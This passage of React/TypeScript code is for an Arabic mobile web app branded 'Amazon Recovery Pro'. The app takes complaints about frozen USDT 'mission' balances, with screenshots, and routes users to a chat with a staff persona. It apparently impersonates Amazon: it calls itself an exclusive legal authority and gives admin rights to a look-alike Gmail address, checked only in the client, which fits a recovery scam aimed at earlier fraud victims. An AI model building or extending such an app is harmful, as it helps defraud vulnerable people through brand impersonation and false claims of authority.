  const [selectedImage, setSelectedImage] = useState<File | null>(null);
  const [imagePreview, setImagePreview] = useState<string | null>(null);

  const [formData, setFormData] = useState({
    link: '',
    missionId: '',
    amount: '',
    reason: 'تجميد الرصيد'
  });

  const [messages, setMessages] = useState<Message[]>([]);
  const [inputValue, setInputValue] = useState('');
  const chatEndRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const chatImageRef = useRef<HTMLInputElement>(null);

  const formatTime = (date: string | Date) => {
    return new Date(date).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  };

  useEffect(() => {
    async function checkStatus() {
      try {
        const { data: { user } } = await supabase.auth.getUser();
        if (!user) return;

        const { data: complaint } = await supabase
          .from('complaints')
          .select('*')
          .eq('user_id', user.id)
          .order('created_at', { ascending: false })
          .limit(1)
          .maybeSingle();

        if (complaint) {
          setHasExistingComplaint(true);
          setCurrentComplaintId(complaint.id);

          const { data: dbMsgs } = await supabase
            .from('complaint_messages')
            .select('*')
            .eq('complaint_id', complaint.id)
            .order('created_at', { ascending: true });

          if (dbMsgs && dbMsgs.length > 0) {
            setMessages(dbMsgs.map(m => ({
              id: m.id,
              text: m.text,
              imageUrl: m.image_url,
              sender: m.sender,
              time: formatTime(m.created_at)
            })));
          } else {
            setMessages([
              {
                id: 0,
                imageUrl: complaint.screenshot_url,
                sender: 'user',
                time: formatTime(complaint.created_at)
              },
              {
                id: 1,
                text: `📋 تفاصيل الطلب المسجل:\nالرابط: ${complaint.platform_link}\nالمهمة: #${complaint.mission_id}\nالمبلغ: ${complaint.amount} USDT`,
                sender: 'user',
                time: formatTime(complaint.created_at)
              }
            ]);
          }
        }
      } catch (err) {
        console.error("Fetch error:", err);
      } finally {
        setLoading(false);
      }
    }
    checkStatus();
  }, []);

  useEffect(() => {
    if (isChatActive) {
      chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
    }
  }, [messages, isChatActive]);

  const handleSendChatImage = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file || !currentComplaintId) return;

    setIsChatUploading(true);
    try {
      const { data: { user } } = await supabase.auth.getUser();
      const fileName = `${user?.id}/${Date.now()}.jpg`;

      const { error: upErr } = await supabase.storage
        .from('chat_images')
        .upload(fileName, file);

      if (upErr) throw upErr;

      const { data: { publicUrl } } = supabase.storage.from('chat_images').getPublicUrl(fileName);

      const { data: msgData, error: dbErr } = await supabase.from('complaint_messages').insert([{
        complaint_id: currentComplaintId,
        user_id: user?.id,
        image_url: publicUrl,
        sender: 'user'
      }]).select().single();

      if (dbErr) throw dbErr;

      if (msgData) {
        setMessages(prev => [...prev, {
          id: msgData.id,
          imageUrl: publicUrl,
          sender: 'user',
          time: formatTime(msgData.created_at)
        }]);
      }
    } catch (err: any) {
      alert("خطأ في الرفع: " + (err.message || "تأكد من إعدادات Storage"));
    } finally {
      setIsChatUploading(false);
      if (chatImageRef.current) chatImageRef.current.value = '';
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedImage) return alert("يرجى إرفاق الصورة");
    setIsSubmitting(true);

    try {
      const { data: { user } } = await supabase.auth.getUser();
      const fileName = `initial/${user?.id}-${Date.now()}.jpg`;

      await supabase.storage.from('complaints').upload(fileName, selectedImage);
      const { data: { publicUrl } } = supabase.storage.from('complaints').getPublicUrl(fileName);

      const { data: comp, error: compErr } = await supabase.from('complaints').insert([{
        user_id: user?.id,
        platform_link: formData.link,
        mission_id: formData.missionId,
        amount: parseFloat(formData.amount),
        reason: formData.reason,
        screenshot_url: publicUrl
      }]).select().single();

      if (compErr) throw compErr;

      const reportText = `📋 *بلاغ جديد:*\nالمنصة: ${formData.link}\nالمهمة: #${formData.missionId}\nالمبلغ: ${formData.amount} USDT`;

      await supabase.from('complaint_messages').insert([
        { complaint_id: comp.id, user_id: user?.id, image_url: publicUrl, sender: 'user' },
        { complaint_id: comp.id, user_id: user?.id, text: reportText, sender: 'user' }
      ]);

      setCurrentComplaintId(comp.id);
      setHasExistingComplaint(true);

      // إعادة جلب الرسائل للتأكد من المزامنة
      const { data: newMsgs } = await supabase
        .from('complaint_messages')
        .select('*')
        .eq('complaint_id', comp.id)
        .order('created_at', { ascending: true });

      if (newMsgs) {
        setMessages(newMsgs.map(m => ({
          id: m.id,
          text: m.text,
          imageUrl: m.image_url,
          sender: m.sender,
          time: formatTime(m.created_at)
        })));
      }
      setIsChatActive(true);
    } catch (err: any) {
      alert("خطأ: " + err.message);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleSendMessage = async () => {
    if (!inputValue.trim() || !currentComplaintId) return;
    const text = inputValue;
    setInputValue('');

    try {
      const { data: { user } } = await supabase.auth.getUser();
      const { data: msgData } = await supabase.from('complaint_messages').insert([{
        complaint_id: currentComplaintId,
        user_id: user?.id,
        text: text,
        sender: 'user'
      }]).select().single();

      if (msgData) {
        setMessages(prev => [...prev, {
          id: msgData.id,
          text: text,
          sender: 'user',
          time: formatTime(msgData.created_at)
        }]);
      }
    } catch (err) {
      console.error(err);
    }
  };

  if (loading) return (
    <div className="bg-white rounded-3xl p-12 shadow-xl flex items-center justify-center">
      <Loader2 className="animate-spin text-[#9B4A4E]" />
    </div>
  );

  if (isChatActive) {
    return (
      <div className="fixed inset-0 z-[100] bg-[#F4F7F9] flex flex-col max-w-[430px] mx-auto animate-in fade-in duration-300">
        <div className="bg-[#9B4A4E] text-white px-4 pt-12 pb-4 flex items-center gap-3 shadow-lg">
          <button onClick={() => setIsChatActive(false)} className="p-1"><ChevronRight size={28} /></button>
          <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center overflow-hidden border border-white/10">
             <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Naser" className="w-full h-full" />
          </div>
          <div className="flex-1 text-right">
            <h2 className="text-sm font-bold">ناصر - مراجعة المرفقات</h2>
            <p className="text-[9px] opacity-70">متصل الآن لمساعدتك</p>
          </div>
          <MoreVertical size={20} className="opacity-40" />
        </div>

        <div className="flex-1 overflow-y-auto p-4 space-y-4 flex flex-col">
          {messages.map((msg) => (
            <div key={msg.id} className={`max-w-[85%] ${msg.sender === 'user' ? 'self-end' : 'self-start'}`}>
              <div className={`rounded-2xl overflow-hidden shadow-sm ${msg.sender === 'user' ? 'bg-[#9B4A4E] text-white rounded-tr-none' : 'bg-white text-gray-800 rounded-tl-none border border-gray-100'}`}>
                {msg.imageUrl && (
                  <img src={msg.imageUrl} className="w-full max-h-64 object-cover cursor-pointer" onClick={() => window.open(msg.imageUrl, '_blank')} />
                )}
                {msg.text && <div className="p-3 text-[11px] text-right whitespace-pre-wrap leading-relaxed">{msg.text}</div>}
                <div className={`px-3 pb-1 flex items-center gap-1 text-[8px] opacity-60 ${msg.sender === 'user' ? 'justify-start' : 'justify-end'}`}>
                  <span>{msg.time}</span>
                  {msg.sender === 'user' && <CheckCheck size={10} />}
                </div>
              </div>
            </div>
          ))}
          {isChatUploading && (
            <div className="self-end bg-white/50 border border-gray-100 p-2 rounded-xl flex items-center gap-2">
              <Loader2 className="animate-spin text-[#9B4A4E]" size={12} />
              <span className="text-[9px] text-[#9B4A4E]">جاري إرسال الصورة...</span>
            </div>
          )}
          <div ref={chatEndRef} />
        </div>

        <div className="bg-white p-4 pb-8 border-t flex items-center gap-3">
          <button onClick={() => chatImageRef.current?.click()} className="p-2 text-gray-400 hover:text-[#9B4A4E]">
            <ImageIcon size={22} />
          </button>
          <input type="file" ref={chatImageRef} className="hidden" accept="image/*" onChange={handleSendChatImage} />
          <div className="flex-1">
            <input 
              type="text" 
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleSendMessage()}
              placeholder="اكتب رسالتك..."
              className="w-full bg-gray-50 rounded-full px-4 py-2.5 text-xs text-right border border-gray-100 outline-none focus:ring-1 focus:ring-[#9B4A4E]/20"
              dir="rtl"
            />
          </div>
          <button onClick={handleSendMessage} className="bg-[#9B4A4E] text-white p-2.5 rounded-full shadow-lg">
            <Send size={18} className="rotate-180" />
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="bg-white rounded-3xl p-6 shadow-xl border border-gray-100">
      {hasExistingComplaint ? (
        <div className="flex flex-col items-center text-center py-4">
          <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mb-4"><MessageSquareText size={36} className="text-green-600" /></div>
          <h3 className="font-bold text-gray-800">طلبك قيد المراجعة</h3>
          <p className="text-[11px] text-gray-500 mt-2 mb-6 px-4">تم تسجيل كافة البيانات بنجاح. يمكنك الآن الدردشة مع ناصر لإرسال صور إضافية.</p>
          <button onClick={() => setIsChatActive(true)} className="w-full bg-[#9B4A4E] text-white font-bold py-4 rounded-2xl flex items-center justify-center gap-3 shadow-lg active:scale-95 transition-transform">
            <Paperclip size={20} /> عرض المرفقات والدردشة
          </button>
        </div>
      ) : (
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-1">
             <label className="text-[10px] font-bold text-gray-400 block pr-2">رابط المنصة</label>
             <input type="text" required placeholder="https://..." value={formData.link} onChange={e => setFormData({...formData, link: e.target.value})} className="w-full bg-gray-50 rounded-xl px-4 py-3 text-xs text-right border border-gray-100" />
          </div>
          <div className="grid grid-cols-2 gap-3">
             <div className="space-y-1">
               <label className="text-[10px] font-bold text-gray-400 block pr-2">رقم المهمة</label>
               <input type="text" required placeholder="#" value={formData.missionId} onChange={e => setFormData({...formData, missionId: e.target.value})} className="w-full bg-gray-50 rounded-xl px-4 py-3 text-xs text-right border border-gray-100" />
             </div>
             <div className="space-y-1">
               <label className="text-[10px] font-bold text-gray-400 block pr-2">المبلغ (USDT)</label>
               <input type="number" required placeholder="0.00" value={formData.amount} onChange={e => setFormData({...formData, amount: e.target.value})} className="w-full bg-gray-50 rounded-xl px-4 py-3 text-xs text-right border border-gray-100" />
             </div>
          </div>
          <div className="space-y-1">
             <label className="text-[10px] font-bold text-gray-400 block pr-2">لقطة شاشة للمهمة (إثبات)</label>
             <div onClick={() => fileInputRef.current?.click()} className="w-full aspect-video rounded-2xl border-2 border-dashed border-gray-200 flex flex-col items-center justify-center bg-gray-50 cursor-pointer overflow-hidden relative">
               {imagePreview ? <img src={imagePreview} className="w-full h-full object-cover" /> : <div className="text-center"><Camera className="mx-auto text-gray-300 mb-2" /><p className="text-[9px] text-gray-400 font-bold">اضغط لإرفاق الصورة</p></div>}
             </div>
          </div>
          <input type="file" ref={fileInputRef} className="hidden" accept="image/*" onChange={(e) => {
            const file = e.target.files?.[0];
            if (file) {
              setSelectedImage(file);
              const reader = new FileReader();
              reader.onloadend = () => setImagePreview(reader.result as string);
              reader.readAsDataURL(file);
            }
          }} />
          <button type="submit" disabled={isSubmitting || !selectedImage} className="w-full bg-[#9B4A4E] text-white font-bold py-4 rounded-2xl disabled:opacity-50 flex items-center justify-center gap-2 shadow-lg active:scale-95 transition-all">
            {isSubmitting ? <Loader2 className="animate-spin" /> : <Gavel size={20} />}
            {isSubmitting ? 'جاري الإرسال...' : 'تقديم الشكوى'}
          </button>
        </form>
      )}
    </div>
  );
};

export default RecoveryForm;

import React, { useState, useEffect } from 'react';
import Header from './components/Header.tsx';
import RecoveryForm from './components/RecoveryForm.tsx';
import LiveStatus from './components/LiveStatus.tsx';
import BottomNav from './components/BottomNav.tsx';
import Auth from './components/Auth.tsx';
import AdminDashboard from './components/AdminDashboard.tsx';
import { supabase, isConfigured } from './lib/supabase.ts';
import { AlertCircle, ExternalLink } from 'lucide-react';

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState('Home');
  const [session, setSession] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [isAdmin, setIsAdmin] = useState(false);

  useEffect(() => {
    if (!isConfigured) {
      setLoading(false);
      return;
    }

    const checkSession = async () => {
      try {
        const { data } = await supabase.auth.getSession();
        const user = data?.session?.user;
        setSession(data?.session || null);

        if (user?.email === 'amzon123@gmail.com') {
          setIsAdmin(true);
          setActiveTab('Admin');
        }
      } catch (err) {
        console.error('Supabase auth error:', err);
        setSession(null);
      } finally {
        setLoading(false);
      }
    };

    checkSession();

    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setSession(session);
      if (session?.user?.email === 'amzon123@gmail.com') {
        setIsAdmin(true);
        setActiveTab('Admin');
      } else {
        setIsAdmin(false);
      }
    });

    return () => subscription.unsubscribe();
  }, []);

  if (!isConfigured) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#F4F7F9] p-6 text-center" dir="rtl">
        <div className="bg-white p-8 rounded-[40px] shadow-2xl max-w-sm border border-orange-100">
          <div className="w-16 h-16 bg-orange-100 text-orange-600 rounded-2xl flex items-center justify-center mx-auto mb-6">
            <AlertCircle size={40} />
          </div>
          <h2 className="text-xl font-black text-gray-800 mb-4">بانتظار مفاتيح الربط!</h2>
          <p className="text-gray-500 text-sm mb-6 leading-relaxed">يرجى ضبط Supabase للبدء.</p>
        </div>
      </div>
    );
  }

  if (loading) return (
    <div className="min-h-screen flex items-center justify-center bg-[#F4F7F9]">
      <div className="w-12 h-12 border-4 border-[#9B4A4E] border-t-transparent rounded-full animate-spin"></div>
    </div>
  );

  if (!session) return <Auth />;

  return (
    <div className="flex flex-col min-h-screen max-w-[430px] mx-auto bg-[#F4F7F9] relative pb-24">
      <Header />

      <main className="flex-1 px-4 py-2">
        {activeTab === 'Admin' && isAdmin ? (
          <AdminDashboard />
        ) : (
          <>
            <LiveStatus />
            <div className="mt-2">
               <div className="flex items-center gap-2 mb-3 px-1">
                  <div className="w-1.5 h-6 bg-[#9B4A4E] rounded-full"></div>
                  <h3 className="text-gray-800 font-bold text-lg text-right w-full">مركز إيقاف المهام ومعالجة الشكاوي</h3>
               </div>
               <RecoveryForm />
            </div>
          </>
        )}

        <div className="mt-6 px-4 text-center">
          <p className="text-[10px] text-gray-400 font-medium leading-relaxed">
            Amazon Recovery Pro هي جهة قانونية تقنية مختصة حصرياً.
          </p>
        </div>
      </main>

      <BottomNav activeTab={activeTab} onTabChange={setActiveTab} isAdmin={isAdmin} />
    </div>
  );
};

export default App;

import React, { useState, useEffect, useRef } from 'react';
import { supabase } from '../lib/supabase.ts';
import { MessageSquare, User, Clock, ChevronLeft, Send, Image as ImageIcon, CheckCheck, Loader2, Search } from 'lucide-react';

interface Complaint {
  id: string;
  created_at: string;
  amount: number;
  mission_id: string;
  platform_link: string;
  profiles: {
    full_name: string;
    customer_code: string;
  };
}

const AdminDashboard: React.FC = () => {
  const [complaints, setComplaints] = useState<Complaint[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [messages, setMessages] = useState<any[]>([]);
  const [inputValue, setInputValue] = useState('');
  const [loading, setLoading] = useState(true);
  const chatEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    fetchComplaints();
    const subscription = supabase
      .channel('public:complaints')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'complaints' }, fetchComplaints)
      .subscribe();

    return () => { subscription.unsubscribe(); };
  }, []);

  useEffect(() => {
    if (selectedId) {
      fetchMessages(selectedId);
      const sub = supabase
        .channel(`chat:${selectedId}`)
        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'complaint_messages', filter: `complaint_id=eq.${selectedId}` }, (payload) => {
           setMessages(prev => [...prev, payload.new]);
        })
        .subscribe();
      return () => { sub.unsubscribe(); };
    }
  }, [selectedId]);

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  const fetchComplaints = async () => {
    const { data } = await supabase
      .from('complaints')
      .select('*, profiles(full_name, customer_code)')
      .order('created_at', { ascending: false });
    if (data) setComplaints(data);
    setLoading(false);
  };

  const fetchMessages = async (id: string) => {
    const { data } = await supabase
      .from('complaint_messages')
      .select('*')
      .eq('complaint_id', id)
      .order('created_at', { ascending: true });
    if (data) setMessages(data);
  };

  const handleSendMessage = async () => {
    if (!inputValue.trim() || !selectedId) return;
    const text = inputValue;
    setInputValue('');

    const { data: { user } } = await supabase.auth.getUser();
    await supabase.from('complaint_messages').insert([{
      complaint_id: selectedId,
      user_id: user?.id,
      text: text,
      sender: 'support'
    }]);
  };

  if (loading) return <div className="flex justify-center p-10"><Loader2 className="animate-spin text-[#9B4A4E]" /></div>;

  if (selectedId) {
    const comp = complaints.find(c => c.id === selectedId);
    return (
      <div className="fixed inset-0 z-[110] bg-white flex flex-col max-w-[430px] mx-auto">
        <div className="bg-[#9B4A4E] text-white px-4 pt-12 pb-4 flex items-center gap-3">
          <button onClick={() => setSelectedId(null)}><ChevronLeft size={28} /></button>
          <div className="flex-1 text-right">
            <h2 className="text-sm font-bold">{comp?.profiles?.full_name}</h2>
            <p className="text-[9px] opacity-70">كود العميل: {comp?.profiles?.customer_code}</p>
          </div>
        </div>

        <div className="flex-1 overflow-y-auto p-4 space-y-3 bg-[#F4F7F9]">
          <div className="bg-blue-50 p-3 rounded-2xl border border-blue-100 text-[10px] text-blue-800 text-right leading-relaxed mb-4">
             ⚠️ مراجعة الطلب:<br/>
             المنصة: {comp?.platform_link}<br/>
             المهمة: #{comp?.mission_id}<br/>
             المبلغ: {comp?.amount} USDT
          </div>

          {messages.map((m) => (
            <div key={m.id} className={`max-w-[85%] ${m.sender === 'support' ? 'self-end' : 'self-start'}`}>
               <div className={`rounded-2xl overflow-hidden shadow-sm ${m.sender === 'support' ? 'bg-[#9B4A4E] text-white rounded-tr-none' : 'bg-white text-gray-800 rounded-tl-none border border-gray-100'}`}>
                 {m.image_url && <img src={m.image_url} className="w-full max-h-60 object-cover" />}
                 {m.text && <div className="p-3 text-[11px] text-right whitespace-pre-wrap">{m.text}</div>}
                 <div className="px-3 pb-1 flex items-center gap-1 text-[8px] opacity-50">
                   {new Date(m.created_at).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}
                 </div>
               </div>
            </div>
          ))}
          <div ref={chatEndRef} />
        </div>

        <div className="p-4 border-t flex items-center gap-2 bg-white">
          <input 
            type="text" 
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && handleSendMessage()}
            placeholder="رد على العميل..."
            className="flex-1 bg-gray-50 rounded-full px-4 py-2.5 text-xs text-right border outline-none focus:border-[#9B4A4E]"
            dir="rtl"
          />
          <button onClick={handleSendMessage} className="bg-[#9B4A4E] text-white p-2.5 rounded-full">
            <Send size={18} className="rotate-180" />
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-4 py-2">
      <div className="bg-white rounded-2xl p-4 shadow-sm border border-gray-100 mb-6">
         <div className="flex items-center justify-between mb-4">
            <span className="bg-[#9B4A4E]/10 text-[#9B4A4E] text-[10px] px-2 py-1 rounded-lg font-bold">لوحة التحكم</span>
            <h2 className="font-black text-gray-800">سجل الطلبات الواردة</h2>
         </div>
         <div className="relative">
            <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
            <input type="text" placeholder="البحث عن عميل..." className="w-full bg-gray-50 rounded-xl py-2 px-10 text-[11px] text-right border-none" dir="rtl" />
         </div>
